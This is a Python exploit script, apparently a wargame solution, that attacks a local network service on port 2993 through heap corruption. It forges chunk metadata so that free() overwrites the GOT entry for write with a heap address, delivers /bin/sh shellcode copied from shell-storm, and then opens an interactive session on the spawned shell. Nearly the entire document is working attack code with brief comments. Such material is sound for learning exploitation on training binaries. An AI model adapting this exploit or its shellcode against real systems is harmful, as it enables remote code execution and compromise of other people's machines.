import socket
import struct
import telnetlib

# Establishes connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 2993))

# Required message size
REQSZ = 128

# Pads messages as required by server: begin with "FSRD", 128 bytes long
def pad(m):
   padding = "\x00"*(REQSZ-len(m)-4)
   m = "FSRD" + m + padding
   return m[:REQSZ]

# Equivelent to negative four
nFour = struct.pack("I", 0xfffffffc)

# Address of write on the global offset table
# (subtracted by 12 to account for normal offset used to obtain back pointer)
write = struct.pack("I", 0x0804d41c-0xc)
# location of jump on heap
heap_addr = struct.pack("I", 0x0804e011)

# Overwrites write with heap_addr during call to free
fake_heap = nFour + nFour + write + heap_addr

# Equivalent to assembly: jmp 0x06 (jumps over overwritten heap section to shellcode location)
jump = "\xeb\x0a"
# Shellcode to run "/bin/sh" - found here: http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

# Sends first heap with shellcode to server
s.send(pad("/ROOT" + jump + "A"*11 + shellcode + "/"*128))
# Sends malformed heap to server
s.send(pad("ROOT/" + fake_heap))

print "Press enter to continue..."

# Opens interactive Telnet terminal with server
t = telnetlib.Telnet()
t.sock = s
t.interact()
